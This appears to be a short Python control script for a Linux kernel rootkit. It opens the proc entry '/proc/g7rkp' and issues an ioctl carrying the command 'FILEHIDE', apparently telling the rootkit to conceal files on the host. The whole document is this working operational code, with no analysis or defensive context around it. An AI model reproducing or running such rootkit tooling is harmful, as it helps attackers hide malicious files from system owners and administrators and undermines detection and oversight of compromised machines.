#!/usr/bin/env python3

import fcntl
import os
import sys

IOCTL_FILEHIDE = 0x80084001

if __name__ == "__main__":
    proc_file = "/proc/g7rkp"
    proc_fd = os.open(proc_file, os.O_RDWR)
    fcntl.ioctl(proc_fd, IOCTL_FILEHIDE, b"FILEHIDE");
